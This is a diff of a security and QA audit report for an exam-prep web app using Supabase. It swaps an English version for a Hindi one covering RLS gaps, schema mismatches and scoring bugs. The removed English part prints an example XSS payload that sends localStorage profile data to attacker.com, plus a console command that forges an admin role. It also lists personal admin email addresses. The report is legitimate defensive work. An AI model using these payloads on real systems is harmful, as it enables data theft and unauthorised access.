@@ -1,289 +1,175 @@
-# DISHA 20-20 — Comprehensive Testing, QA & Security Audit Report
-
-> **Auditor Role**: Senior QA Engineer + Lead Security Auditor + Full-Stack Code Reviewer  
-> **Date**: 18 November 2026  
-> **Target Application**: DISHA 20-20 (Rajasthan Competitive Exam Preparation & MCQ Engine)  
-> **Repository Path**: `/data/user/0/com.termux/files/home/projects/Disha-`  
-> **Status**: **AUDIT COMPLETED — NO CODE MODIFIED (Awaiting User Authorization)**
+# दिशा (DISHA 20-20) — व्यापक तकनीकी, सुरक्षा एवं Supabase ऑडिट रिपोर्ट
+**दस्तावेज़ संस्करण**: 2.0 (Supabase Deep-Dive & Complete Code Audit)  
+**लेखा परीक्षक (Auditor)**: सीनियर क्यूए इंजीनियर, सुरक्षा लेखा परीक्षक एवं Supabase विशेषज्ञ  
+**तारीख**: 18 नवंबर 2026  
+**ऑडिट स्थिति**: ऑडिट संपन्न (समीक्षा एवं स्वीकृति हेतु प्रस्तुत) — *वर्तमान में कोई कोड परिवर्तन नहीं किया गया है*
 
 ---
 
-## Executive Summary
+## 1. प्रोजेक्ट संरचना एवं Supabase उपयोग सूची (Project Overview & Supabase Inventory)
 
-DISHA 20-20 का सम्पूर्ण एवं गहन Technical QA, Security SAST, Architecture और UI/UX Audit सफलता पूर्वक सम्पन्न किया गया। इस ऑडिट के दौरान **कुल 12 मुख्य समस्याओं (Bugs / Vulnerabilities / Discrepancies)** की पहचान और सत्यापन (Verification) किया गया है।
+### 1.1 टेक स्टैक (Tech Stack)
+* **फ्रंटएंड फ्रेमवर्क**: React 19, TypeScript, Vite 6, Tailwind CSS v4, Motion (Framer Motion v12)
+* **आइकॉन एवं रेंडरिंग**: Lucide React, KaTeX (गणितीय समीकरण), Canvas Confetti, DOMPurify
+* **लोकल स्टोरेज व कैश**: IndexedDB v5 (कस्टम इंजन), LocalForage, Service Worker PWA
+* **बैकएंड व डेटाबेस**: Supabase (PostgreSQL 15+, PostgREST, GoTrue Auth)
+* **क्लाइंट लाइब्रेरी**: `@supabase/supabase-js` v2.119.0 (कस्टम प्रॉक्सी फॉलबैक के साथ)
 
-मुख्य जोखिमों में **Stored Cross-Site Scripting (XSS)** का खतरा, **Client-Side Admin Role Escalation**, **Frontend व PostgreSQL Database RLS Whitelist में असंगति**, **Negative Marking Scoring Formula में बेमेल**, **Topic Navigation का Infinite Back Loop**, और **Broken ESLint Configuration** शामिल हैं।
+### 1.2 Supabase उपयोग सूची (Supabase Resource Mapping)
 
-ऑडिट के नियमों के अनुसार **कोई भी कोड परिवर्तन (Code Modification) नहीं किया गया है**। यह रिपोर्ट विस्तृत विश्लेषण, सत्यापन साक्ष्य और सुधार योजना प्रस्तुत करती है।
-
----
-
-## STEP 1: Project Architecture & Structure Overview
-
-### 1.1 Tech Stack
-- **Frontend Framework**: React 19 (`19.0.1`), React DOM 19
-- **Language**: TypeScript 5.9.3 (Strict mode, ES2022 target)
-- **Bundler & Tooling**: Vite 8.3.0, @vitejs/plugin-react 6.1.1
-- **Styling**: Tailwind CSS v4 (`@tailwindcss/vite` 4.3.3)
-- **Database & Backend**: Supabase JavaScript Client (`@supabase/supabase-js` 2.119.0) with PostgreSQL Row Level Security (RLS)
-- **Offline & Persistence**: IndexedDB via native wrappers and `localforage` 1.10.0, fallback `localStorage` / `sessionStorage`
-- **Math Rendering & Rich Text**: KaTeX (`katex` 0.19.0), React Markdown (`react-markdown` 10.1.0)
-- **Testing Engine**: Vitest 5.1.0, JSDOM 30.1.3
-- **PWA & Offline Support**: `vite-plugin-pwa` 2.0.0, Service Worker (`sw-push-handler.js`)
-
-### 1.2 Folder Structure
-```
-Disha-/
-├── public/                 # Favicons, PWA icons, sitemap, robots.txt, SW
-├── scripts/                # Database seed scripts (seed_supabase.mjs, seed_pilot.mjs)
-├── supabase/               # SQL migrations and schema definition
-│   ├── migrations/         # Timestamped SQL migration patches
-│   └── schema.sql          # Canonical PostgreSQL schema, tables, and RLS policies
-├── tests/                  # 48 Vitest suites (547 automated integration & unit tests)
-├── src/
-│   ├── components/         # UI Screens, Modals, Tabs, Navigation
-│   │   ├── admin/          # Admin panels, syllabus editors, bulk tools, diagnostics
-│   │   ├── analyzer/       # Exam paper analysis modal
-│   │   ├── news/           # News, editorial articles, RawHtmlArticleViewer
-│   │   ├── ui/             # Core UI atoms (modals, dialogs, buttons)
-│   │   ├── AdminTab.tsx    # Administrator management tab
-│   │   ├── ChapterDetailView.tsx # Chapter-level topics view and practice trigger
-│   │   ├── HomeTab.tsx     # Student dashboard, daily progress, subject carousel
-│   │   ├── MCQSessionModal.tsx   # Core interactive quiz/exam engine (4,800+ lines)
-│   │   ├── PYQVaultTab.tsx # Previous Year Question papers vault
-│   │   ├── TopicsTab.tsx   # Curriculum exploration (Subjects -> Chapters -> Topics)
-│   │   └── WrongTab.tsx    # Mistake notebook and revision mode
-│   ├── data/               # Static base curriculum data and questions
-│   ├── hooks/              # Custom React hooks (navigation, modals, curriculum)
-│   ├── lib/                # Supabase client singleton (`lib/supabase.ts`)
-│   ├── utils/              # Storage engines, sync services, analytics, sanitizers
-│   │   ├── cleanSlate.ts           # Schema validation and mock test stripping
-│   │   ├── dataIntegrityEngine.ts  # Foreign key and orphan question reconciler
-│   │   ├── indexedDbCache.ts       # Low-level IndexedDB stores and transactions
-│   │   ├── questionsStorage.ts     # In-memory and persisted curriculum store
-│   │   ├── routeNavigation.ts      # Canonical URL hash and path routing
-│   │   ├── studentWriteBuffer.ts   # Offline-first transaction buffer and outbox
-│   │   ├── supabaseSyncService.ts  # Authoritative bidirectional cloud sync
-│   │   └── userProfileStorage.ts   # Local profile, session, and role checks
-│   ├── App.tsx             # Root orchestration, popstate routing, global overlays
-│   └── main.tsx            # React root mount point
-└── package.json            # Node project configuration and script definitions
-```
-
-### 1.3 Core Features & User Journey
-1. **Student Practice & Study Engine**: 
-   - Topic-wise timed MCQ practice sessions with instantaneous instant-feedback or exam countdown mode.
-   - Comprehensive solution explanations with KaTeX mathematical/scientific notation rendering.
-   - Revision notebook tracking incorrect answers (`WrongTab`) and bookmarked questions.
-2. **Previous Year Papers (PYQ Vault)**:
-   - Full past competitive exams with official cutoff marks, timer enforcement, and rank estimations.
-3. **Live Test Series**:
-   - Scheduled real-time mock exams with negative marking penalties (1/3rd or 2/3rd penalty).
-4. **Current Affairs & Exam News**:
-   - Rich editorial news portal with table of contents, responsive tables, and FAQ schema injection.
-5. **Offline-First Resilience**:
-   - Background IndexedDB caching allows students with intermittent internet connectivity to complete quizzes offline and synchronize when reconnected via `studentWriteBuffer`.
-6. **Administrator Portal**:
-   - Curriculum CRUD (Subjects, Chapters, Topics), CSV/AI/HTML question bulk import, orphan data reconciler, and Supabase audit diagnostics.
-
-### 1.4 Auth & Security Perimeter
-- **Client Auth**: Handled through Supabase Google OAuth and local profile persistence.
-- **Admin Verification**: Hybrid check comparing authenticated user email against `ADMIN_EMAILS` array and server JWT `app_metadata.role`.
-- **Database Rules**: Supabase PostgreSQL Row Level Security (RLS) restricts `INSERT`, `UPDATE`, and `DELETE` on curriculum tables (`subjects`, `chapters`, `topics`, `questions`, `news_articles`) strictly to `public.is_admin()`.
-
----
-
-## STEP 2: Static Code & Reliability Audit
-
-### 2.1 Crashes & Environment Tooling Failures
-- **ESLint Execution Crash**: `eslint.config.js` tries to load `@firebase/eslint-plugin-security-rules`, which is not installed. Running `pnpm exec eslint` fails with `ERR_MODULE_NOT_FOUND`.
-- **Storage SecurityError in Restricted WebViews**: In `src/utils/userProfileStorage.ts` (line 88), `clearUserProfile` calls raw `localStorage.removeItem(USER_PROFILE_KEY)` rather than `safeRemoveLocalStorageItem`. In third-party sandboxed mobile in-app browsers (Instagram, Facebook), direct `localStorage` access triggers an unhandled `DOMException: SecurityError`.
-
-### 2.2 Logic Bugs & Scoring Inconsistencies
-- **Negative Marking Formula Inconsistency**:
-  - In `handleSubmit` inside `src/components/MCQSessionModal.tsx` (lines 1192 and 1239), the saved score calculates negative marks using `session.negativeMarking ?? 0.33`.
-  - In `ExamSubmissionOverlay` (lines 3880 and 4103), the displayed result calculates negative marks using `session.negativeMarking ?? (isLive ? 0.66 : Number((marksPerQ / 3).toFixed(2)))`.
-  - **Impact**: For live tests with 2 marks per question, the database attempt record deducts `0.33` per mistake, while the overlay screen calculates and displays `-0.66`. The user sees a different score on the result modal than what is permanently saved in their history.
-- **Floating Point Arithmetic Leakage**: In `MCQSessionModal.tsx:1239`, raw arithmetic `totalCorrect * marks - totalWrong * negMarks` is assigned directly to `smartRecord.score` without `.toFixed(2)` rounding, causing IEEE-754 precision drift (e.g. `14.330000000000002`).
-
-### 2.3 State Management & Navigation Loops
-- **Infinite MCQ Session / Topic Back Navigation Loop**:
-  - When a user opens a topic from `ChapterDetailView`, `selectedTopicId` is pushed to URL history. Starting the test pushes `?session=1`.
-  - Upon closing the session or clicking the browser back button, `handlePopState` clears `activeSession` and `selectedTopicId`.
-  - However, line 536 immediately calls `resolvePathToNavigationState(path, searchParams)` on the remaining URL path (`/topics/subject/chapter/topic`).
-  - Line 541 re-sets `setSelectedTopicId(parsed.topicId)`. This causes `ChapterDetailView` to re-detect `selectedTopicForModal` as non-null, immediately re-opening the topic interaction modal or restarting the session!
-
-### 2.4 Data Integrity & Automatic "General Practice" Renaming
-- **Orphan Question Salvage Overwriting Topic Names**:
-  - In `src/utils/questionsStorage.ts` (lines 1029–1031) and `src/utils/dataIntegrityEngine.ts` (lines 256–265, 286–287), any question created without an already-indexed topic ID or with legacy IDs (`"gen"`, `"chapter_general"`) automatically falls back to `"General Practice (सामान्य अभ्यास)"` or `(targetChapter.topics || [])[0]`.
-  - If an admin creates a custom topic and adds questions before full curriculum sync has completed, the system defaults the questions to "General Practice", overriding the custom topic name in the UI.
-
-### 2.5 Performance Bottlenecks & Network Overhead
-- **First-Time Load Delay (Missing Snapshot 404)**:
-  - In `src/utils/questionsStorage.ts` (line 203), every new user with an empty IndexedDB initiates a fetch for `/api/snapshots/v1/content.json`.
-  - Because this endpoint does not exist on the web server, it returns a 404 HTML response, wasting bandwidth, delaying hydration, and polluting browser console with errors.
-- **Unbundled Question Seeding**:
-  - New users only receive subject, chapter, and topic metadata. All topics render with `0 Questions` until the user individually taps each topic, incurring an on-demand network round-trip.
-
----
-
-## STEP 3: Security & Penetration Audit
-
-### 3.1 Stored XSS Vulnerability in Article Viewer (Critical)
-- **File**: `src/components/news/RawHtmlArticleViewer.tsx:28-37, 1150`
-- **Vulnerability**: 
-  - `RawHtmlArticleViewer` takes `htmlContent` and renders it via `dangerouslySetInnerHTML={{ __html: htmlContent }}` WITHOUT sanitizing it through `DOMPurify.sanitize`.
-  - Even worse, lines 28–37 intentionally find and execute any `<script>` tags by re-creating them using `document.createElement("script")`.
-  - **Attack Vector**: If an attacker injects a script tag (e.g. `<script>fetch('https://attacker.com/steal?data='+localStorage.getItem('disha_user_profile'))</script>`) into any article, blog post, or RSS feed, the code executes directly in the browser of any user or administrator reading that article.
-
-### 3.2 Client-Side Admin Privilege Escalation (High)
-- **File**: `src/utils/userProfileStorage.ts:117` and `src/components/admin/AdminDiagnosticsSection.tsx:88`
-- **Vulnerability**:
-  - `isUserAdmin()` checks: `if (stored?.role === "admin") return true;`.
-  - Because `stored` is read from client `localStorage`, any regular student can open DevTools and run:
-    ```javascript
-    localStorage.setItem('disha_user_profile', JSON.stringify({ email: 'student@example.com', role: 'admin' }));
-    ```
-  - Upon reloading, the UI unlocks the **Admin Tab**, **Diagnostics Report**, and **Supabase Audit Console**.
-  - While PostgreSQL RLS prevents write mutations to Supabase, unauthorized users can view admin screens, cached student records, and system diagnostics.
-
-### 3.3 Admin Authorization Discrepancy (Database vs Frontend)
-- **Files**: `src/utils/userProfileStorage.ts:6-10` vs `supabase/schema.sql:138`
-- **Vulnerability**:
-  - Frontend `ADMIN_EMAILS` whitelist:
-    `['jagdishpaliyaljat@gmail.com', 'kamleshchoudhary96022@gmail.com', 'disha2020prep@gmail.com']`
-  - PostgreSQL Database `is_admin()` SQL function:
-    `('jagdishpaliyaljat@gmail.com', 'zdpaliyal@gmail.com')`
-  - **Issue**: `kamleshchoudhary96022@gmail.com` is granted admin privileges in the UI, but when they attempt to create, edit, or delete a topic, subject, or question, Supabase PostgreSQL rejects the query with:
-    `42501 (permission denied for table subjects/chapters/topics/questions)`.
-  - In reverse, `zdpaliyal@gmail.com` is recognized as an admin by the database, but locked out by the frontend!
-
----
-
-## STEP 4: Functional & Edge-Case Testing
-
-| Test Area | Action / Flow | Observed Result | Status |
+| संसाधन प्रकार (Resource) | संसाधन नाम (Name / Target) | उपयोग फ़ाइलें (Usage Locations) | RLS स्थिति |
 | :--- | :--- | :--- | :--- |
-| **Authentication** | Sign in with Google (Admin) | Correctly sets profile in memory and `localStorage`. | Pass |
-| **Authentication** | Sign in with Student account | Student view loaded. Admin tab hidden. | Pass |
-| **Offline Mode** | Turn off network during quiz | Answers buffer in IndexedDB outbox (`studentWriteBuffer`). | Pass |
-| **Online Resume** | Restore network after offline quiz | Auto-flushes buffered student attempts to Supabase. | Pass |
-| **MCQ Practice** | Start Chapter Practice Test | Loads questions, tracks timer, saves study history. | Pass |
-| **PYQ Exam** | Complete 100-Question Exam | Auto-calculates cutoff, percentile, and rank. | Pass |
-| **Navigation** | Back button from Topic to Chapter | **FAIL**: Topic modal / MCQ session reopens due to popstate loop. | **Bug Verified** |
-| **Admin Syllabus** | Add Topic with custom name | Name occasionally resets to "General Practice" after salvage sync. | **Bug Verified** |
-| **Toast Alerts** | Admin save action triggers notification | **FAIL**: 120px+ notification card blocks 35% of mobile screen. | **Bug Verified** |
-| **First Load** | First time visit on clean browser | **FAIL**: 404 network error on snapshot JSON; multi-second delay. | **Bug Verified** |
+| **टेबल (Table)** | `public.subjects` | `supabaseSyncService.ts`, `AdminDiagnosticsSection.tsx`, `syncCoordinator.ts` | **RLS ENABLED** (Public Read, Admin Write) |
+| **टेबल (Table)** | `public.chapters` | `supabaseSyncService.ts`, `AdminDiagnosticsSection.tsx`, `syncCoordinator.ts` | **RLS ENABLED** (Public Read, Admin Write) |
+| **टेबल (Table)** | `public.topics` | `supabaseSyncService.ts`, `AdminDiagnosticsSection.tsx`, `syncCoordinator.ts` | **RLS ENABLED** (Public Read, Admin Write) |
+| **टेबल (Table)** | `public.questions` | `supabaseSyncService.ts`, `shareService.ts`, `AdminDiagnosticsSection.tsx`, `WrongTab.tsx` | **RLS ENABLED** (Public Read, Admin Write) |
+| **टेबल (Table)** | `public.profiles` | `userManagementStorage.ts`, `supabaseSyncService.ts` | **RLS ENABLED** (Owner Read/Write, Admin Read) |
+| **टेबल (Table)** | `public.attempts` | `supabaseSyncService.ts`, `userActivityQueue.ts`, `syncCoordinator.ts`, `guestManager.ts` | **RLS ENABLED** (Owner/Admin Read, Owner Insert) |
+| **टेबल (Table)** | `public.bookmarks` | `supabaseSyncService.ts`, `userActivityQueue.ts`, `syncCoordinator.ts` | **RLS ENABLED** (Owner Read/Insert/Delete) |
+| **टेबल (Table)** | `public.contact_messages` | `contactStorage.ts` | **RLS ENABLED** (Public Insert, Admin Read/Update/Delete) |
+| **टेबल (Table)** | `public.question_reports` | `questionReportService.ts` | **RLS ENABLED** (Public Insert, Admin Read/Update/Delete) |
+| **स्टोरेज बकेट्स (Storage)** | `banners` (Public), `materials` (Private) | माइग्रेशन `20261116_production_hardening.sql` में परिभाषित (क्लाइंट में अभी अनयूज्ड) | **RLS ENABLED** (आकार/MIME सीमाएं अनुपस्थित) |
+| **डेटाबेस फंक्शन्स (RPC)** | `public.is_admin()` | `schema.sql`, माइग्रेशन्स (सिक्योरिटी डेफिनर, एम्प्टी सर्च पाथ) | **HARDENED** |
+| **रियलटाइम (Realtime)** | `supabase.auth.onAuthStateChange` | `App.tsx`, `AdminTab.tsx` (अनसब्सक्राइब हुक मौजूद, कोई मेमोरी लीक नहीं) | सुरक्षित |
+| **एज फंक्शन्स (Edge Functions)**| - | वर्तमान में प्रोजेक्ट में कोई Supabase Edge Functions प्रयुक्त नहीं हैं | लागू नहीं |
 
 ---
 
-## STEP 5: UI/UX & Responsive Evaluation
+## 2. Supabase सुरक्षा ऑडिट (Security & RLS Deep-Dive)
 
-### 5.1 Mobile Viewports (360px & 390px)
-1. **Oversized Notification Cards**:
-   - Supabase sync and save notification cards take up 120–140px vertical height.
-   - On a 360px x 640px screen (e.g. Galaxy S8 or small Android devices), this covers more than a third of the active viewport, blocking buttons, chapter navigation, and form inputs.
-   - Notifications lack an aggressive auto-dismiss timeout (taking 6–10 seconds or remaining static until clicked).
-2. **Touch Targets (< 44px)**:
-   - Several small badge buttons in `ChapterDetailView` (e.g., share icon and question counter badges) measure 36px or less, making them difficult to tap accurately on compact touchscreens.
-3. **Contrast & Dark Mode**:
-   - Subtitle text using `text-slate-400` on dark background `#171923` yields a contrast ratio of ~3.8:1, slightly below the WCAG AA minimum standard of 4.5:1.
-
----
-
-## STEP 6: Master Bug Table & Findings Catalog
-
-| ID | Severity | Category | File:Line / Screen | Problem | Steps to Reproduce | Expected vs Actual | Suggested Fix | Status |
-| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
-| **BUG-01** | **High** | Environment / Tooling | `eslint.config.js:1` | Missing package `@firebase/eslint-plugin-security-rules` causes ESLint to crash on startup. | Run `pnpm exec eslint` in project root. | Expected: Lint completes successfully.<br>Actual: Throws `ERR_MODULE_NOT_FOUND`. | Replace legacy Firebase ESLint configuration with standard TypeScript/React flat config. | **Verified** |
-| **BUG-02** | **Critical** | Security / XSS | `src/components/news/RawHtmlArticleViewer.tsx:28-37, 1150` | Unsanitized `dangerouslySetInnerHTML` combined with active `<script>` tag execution enables Stored XSS. | Inject `<script>alert(1)</script>` into article HTML content and open news view. | Expected: Script tags stripped by DOMPurify.<br>Actual: Script executes in user/admin browser. | Sanitize HTML using `DOMPurify.sanitize(htmlContent, ...)` and remove dynamic script execution. | **Verified** |
-| **BUG-03** | **High** | Security / Auth | `src/utils/userProfileStorage.ts:117`, `AdminDiagnosticsSection.tsx:88` | Client trusts untrusted `localStorage.role === "admin"`, allowing regular students to access admin screens. | Run `localStorage.setItem('disha_user_profile', JSON.stringify({role: 'admin'}))` in console and refresh. | Expected: Access denied without authenticated email/JWT.<br>Actual: Admin Tab and diagnostics unlocked. | Remove `stored?.role === "admin"` fallback; verify strictly against `ADMIN_EMAILS` and server JWT claim. | **Verified** |
-| **BUG-04** | **High** | Security / RLS Discrepancy | `src/utils/userProfileStorage.ts:6-10` vs `supabase/schema.sql:138` | Admin email whitelist mismatch between frontend and PostgreSQL RLS leads to database `42501` write rejection for authorized admin. | Log in with `kamleshchoudhary96022@gmail.com` and attempt to add a subject or topic. | Expected: Subject saves to Supabase.<br>Actual: Supabase returns `42501 (permission denied for table)`. | Synchronize admin emails across `ADMIN_EMAILS` and PostgreSQL `is_admin()` SQL definition. | **Verified** |
-| **BUG-05** | **High** | Logic / Calculation | `src/components/MCQSessionModal.tsx:1192-1240` vs `:4103` | Negative marking formula mismatch between saved record (`0.33`) and result overlay (`0.66`), plus unrounded float drift. | Complete a live test with 2 marks per question and incorrect answers. | Expected: Saved score matches displayed score.<br>Actual: Saved score penalizes `0.33`, overlay displays `0.66`. | Standardize `negMarksPerQ` logic across save and display routines, rounding to 2 decimals. | **Verified** |
-| **BUG-06** | **High** | UI/UX / Navigation | `src/App.tsx:278-294`, `src/App.tsx:504-541`, `ChapterDetailView.tsx:216-222` | Back navigation from topic practice triggers infinite popstate loop, repeatedly re-opening MCQ session. | Open topic -> start practice -> press back button or close session -> press back again. | Expected: Return to chapter topic list, then subject view.<br>Actual: Topic session / modal reopens continuously. | Adjust popstate resolver and use `replaceState` to clear `selectedTopicId` without re-triggering modal. | **Verified** |
-| **BUG-07** | **Medium** | Logic / Curriculum | `src/utils/questionsStorage.ts:1029-1031`, `dataIntegrityEngine.ts:256-287` | Questions without pre-synced topic IDs are automatically reassigned to "General Practice (सामान्य अभ्यास)". | Create new topic in Admin, add questions before cloud sync, then refresh. | Expected: Questions retain custom topic name.<br>Actual: Topic is renamed to "General Practice". | Prevent overwrite of custom topic IDs and replace hardcoded "General Practice" fallback. | **Verified** |
-| **BUG-08** | **Medium** | Performance / Network | `src/utils/questionsStorage.ts:201-250` | Missing snapshot `/api/snapshots/v1/content.json` causes 404 network error and multi-second first-load delay. | Clear browser cache and open app. Check DevTools Network tab. | Expected: Fast hydration without 404s.<br>Actual: 404 on content.json, initial topics show 0 questions. | Remove dead snapshot fetch and include aggregated question counts in the initial `topics` Supabase query. | **Verified** |
-| **BUG-09** | **Medium** | Runtime / Compatibility | `src/utils/userProfileStorage.ts:88` | `clearUserProfile` calls raw `localStorage.removeItem`, which crashes in restricted in-app mobile WebViews. | Trigger logout in a sandboxed iframe or Instagram in-app WebView. | Expected: Smooth session cleanup.<br>Actual: Potential `DOMException: SecurityError`. | Replace with `safeRemoveLocalStorageItem(USER_PROFILE_KEY)`. | **Verified** |
-| **BUG-10** | **Medium** | UI/UX / Mobile Layout | `src/components/NotificationToast.tsx` / `src/App.tsx` | Oversized notification cards (120px+) occlude active mobile viewport and block user clicks on forms/topics. | Perform an admin save or sync operation on a 360px mobile screen. | Expected: Compact top toast (48-56px).<br>Actual: Large card covers center-top working area for >6s. | Redesign notification UI into a compact toast (48-54px height, max 1 active, 2s auto-dismiss on success). | **Verified** |
-| **BUG-11** | **Low** | Code Health / Dead Code | `src/utils/studentWriteBuffer.ts:52, 1144` | Legacy Firestore constants and unused metric counters linger in Supabase sync buffer. | Inspect `studentWriteBuffer.ts` lines 52 and 1144. | Expected: Pure Supabase PostgreSQL batching semantics.<br>Actual: Legacy Firestore references remain. | Remove dead Firestore comments and metric fields from sync outbox types. | **Verified** |
-| **BUG-12** | **Low** | UI/UX / Accessibility | `src/components/ChapterDetailView.tsx:185-197` | Small touch targets (< 44px) and sub-optimal text contrast (`text-slate-400` on dark) on 360px screens. | Measure button touch areas with Chrome DevTools on a 360px viewport. | Expected: Touch targets >= 44x44px, contrast >= 4.5:1.<br>Actual: Targets measure ~36px; contrast is ~3.8:1. | Increase padding/dimensions to 44px minimum and adjust dark mode color tokens. | **Verified** |
+1. **service_role Key एक्सपोज़र ऑडिट**:
+   * फ्रंटएंड सोर्स कोड (`src/`), डिप्लॉयमेंट बंडल (`dist/`), तथा गिट हिस्ट्री की गहन स्कैनिंग की गई।
+   * **परिणाम**: क्लाइंट बंडल में **शून्य (0) `service_role` की** पाई गई। केवल पब्लिक `anon` की उपलब्ध है। यह पूरी तरह सुरक्षित है।
+2. **डेटाबेस RLS कवरेज**:
+   * सभी 9 टेबल्स पर PostgreSQL स्तर पर `ENABLE ROW LEVEL SECURITY` सक्रिय है। बिना पॉलिसी के कोई भी टेबल ओपन नहीं है।
+3. **एडमिन ऑथराइजेशन आर्किटेक्चर**:
+   * फ्रंटएंड पर `isUserAdmin()` केवल 4 अधिकृत ईमेल्स को अनुमति देता है।
+   * डेटाबेस स्तर पर `is_admin()` SQL फंक्शन `auth.jwt() -> 'app_metadata' ->> 'role' = 'admin'` अथवा चारों ईमेल्स की पुष्टि करता है।
+4. **पाए गए सुरक्षा एवं लॉजिक जोखिम**:
+   * **RLS पॉलिसी की कमी**: `public.profiles` पर कोई `DELETE` पॉलिसी नहीं है, जिससे एडमिन द्वारा यूजर प्रोफाइल डिलीट करने का प्रयास 42501 एरर के साथ विफल होता है।
+   * **अपडेट पॉलिसी की कमी (Bookmarks Upsert)**: `public.bookmarks` पर `UPDATE` पॉलिसी नहीं है, जिसके कारण क्लाइंट द्वारा `.upsert({ onConflict: 'user_id,question_id' })` करने पर डुप्लीकेट विवाद में अपडेट ब्लॉक हो जाता है।
+   * **ईमेल सत्यापन गैप**: `is_admin()` फंक्शन में `email_confirmed_at IS NOT NULL` की जांच नहीं है। यदि Supabase डैशबोर्ड में ईमेल कन्फर्मेशन बंद हो, तो असत्यापित अकाउंट एडमिन बन सकता है।
+   * **अन-रेट-लिमिटेड पब्लिक इंसर्ट**: `contact_messages` और `question_reports` में `FOR INSERT WITH CHECK (true)` है बिना किसी आईपी दर-सीमा या कैप्चा के, जिससे डेटाबेस स्पैम की संभावना है।
 
 ---
 
-## Severity-Wise Count Summary
+## 3. संपूर्ण ऑडिट निष्कर्ष तालिका (Complete Findings Log)
+
+| ID | Severity | Category | File:Line / Screen | Problem (समस्या) | Steps to Reproduce | Expected vs Actual | Suggested Fix | Status |
+| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
+| **SUPA-01** | **Critical** | Data Loss / Logic | `src/services/snapshot/userActivityQueue.ts:149-174` | ऑफलाइन एक्टिविटी कतार (Queue) में Supabase एरर चेक नहीं होता तथा कॉलम का नाम डेटाबेस से मेल नहीं खाता (`question_id`, `selected_option`, `is_correct`, `time_spent` जो `attempts` टेबल में नहीं हैं)। डेटाबेस पोस्टग्रेएसक्यूएल 42703 एरर देता है, लेकिन कतार बिना जांचे इवेंट्स को हमेशा के लिए डिलीट कर देती है! | 1. ऑफलाइन मोड में 1 प्रश्न हल करें।<br>2. नेटवर्क कनेक्ट करें।<br>3. `flushActivityQueue` रन होने दें। | **Expected**: प्रयास सफलतापूर्वक डेटाबेस में दर्ज हो।<br>**Actual**: कॉलम मिसमैच के कारण सर्वर अस्वीकार करता है, पर लोकल कतार इवेंट को मिटा देती है। डेटा हमेशा के लिए गायब हो जाता है। | `attempts` टेबल के सही स्कीमा (`score`, `total_questions`, `answers`, `time_spent_seconds`) के अनुसार इंसर्ट करें तथा `{ error }` होने पर कतार से डिलीट न करें। | **Verified** |
+| **SUPA-02** | **High** | Schema Mismatch / Bug | `src/utils/userManagementStorage.ts:366-371` | एडमिन पैनल के छात्र गतिविधि व्यू में `attempts` टेबल से `row.is_correct` और `row.time_spent` पढ़ा जा रहा है, जबकि डेटाबेस में कॉलम `score` और `time_spent_seconds` हैं। इसके कारण एडमिन को छात्र के सभी टेस्ट का स्कोर 0, सही 0, गलत 1 और समय 0 दिखाई देता है। | 1. एडमिन पैनल में "User Management" खोलें।<br>2. किसी छात्र के नाम पर क्लिक करके उसका टेस्ट इतिहास देखें। | **Expected**: छात्र का वास्तविक स्कोर और समय प्रदर्शित हो।<br>**Actual**: सभी स्कोर 0, Accuracy 0%, Time 0s दिखते हैं क्योंकि कोड अमान्य कॉलम ढूंढ रहा है। | कोड को `row.score`, `row.total_questions`, `row.time_spent_seconds` पढ़ने हेतु अद्यतन करें। | **Verified** |
+| **SUPA-03** | **High** | Schema Mismatch / API 400 | `src/utils/shareService.ts:203` | प्रश्न शेयर लिंक (`/share/question/...`) लोड करते समय Supabase से `table_data, source, exam_year, category` कॉलम मांगे जाते हैं जो `public.questions` टेबल में मौजूद ही नहीं हैं। PostgREST `PGRST100 (column not found)` एरर लौटाता है जिससे शेयर्ड प्रश्न लोड नहीं होता। | 1. किसी प्रश्न का शेयर लिंक जनरेट करें।<br>2. दूसरे ब्राउज़र/टैब में लिंक खोलें। | **Expected**: प्रश्न लोड होकर स्क्रीन पर दिखे।<br>**Actual**: 400 Bad Request आता है और प्रश्न लोड नहीं होता। | `select` क्वेरी से गैर-मौजूद कॉलम्स हटाएं या केवल वैध कॉलम्स `id,question,options,correct_answer,explanation,subject_id,chapter_id,topic_id,exam,year,level` प्रोजेक्ट करें। | **Verified** |
+| **SUPA-04** | **High** | RLS Policy Defect | `supabase/schema.sql:209-213` & `userManagementStorage.ts:328` | `public.profiles` पर कोई `DELETE` पॉलिसी मौजूद नहीं है। जब एडमिन यूजर मैनेजमेंट से किसी स्पैम या फर्जी यूजर को डिलीट करता है, तो Supabase RLS एरर 42501 (Permission Denied) फेंक देता है। | 1. एडमिन पैनल में User Management खोलें।<br>2. किसी टेस्ट यूजर को डिलीट करें। | **Expected**: एडमिन प्रोफाइल को डिलीट कर सके।<br>**Actual**: RLS डिलीट ब्लॉक कर देता है; डिलीट केवल लोकल स्टेट में होता है, क्लाउड में नहीं। | `supabase/schema.sql` में `CREATE POLICY "Admins can delete profiles" ON public.profiles FOR DELETE USING (public.is_admin());` जोड़ें। | **Verified** |
+| **SUPA-05** | **High** | RLS Policy Defect | `supabase/schema.sql:232-236` & `syncCoordinator.ts:289` | `public.bookmarks` पर केवल SELECT, INSERT और DELETE नीतियां हैं, लेकिन कोई `UPDATE` पॉलिसी नहीं है। जब क्लाइंट `.upsert(..., { onConflict: "user_id,question_id" })` करता है, तो डुप्लीकेट होने पर PostgreSQL RLS एरर 42501 के साथ ऑपरेशन फेल कर देता है। | 1. एक प्रश्न को दो बार बुकमार्क करने का प्रयास करें।<br>2. क्लाउड सिंक ट्रिगर करें। | **Expected**: बुकमार्क सुरक्षित रूप से इडेम्पोटेंट रहे।<br>**Actual**: RLS एरर 42501 आता है क्योंकि UPDATE अनुमति नहीं है। | `CREATE POLICY "Users can update own bookmarks" ON public.bookmarks FOR UPDATE USING (auth.uid() = user_id) WITH CHECK (auth.uid() = user_id);` जोड़ें। | **Verified** |
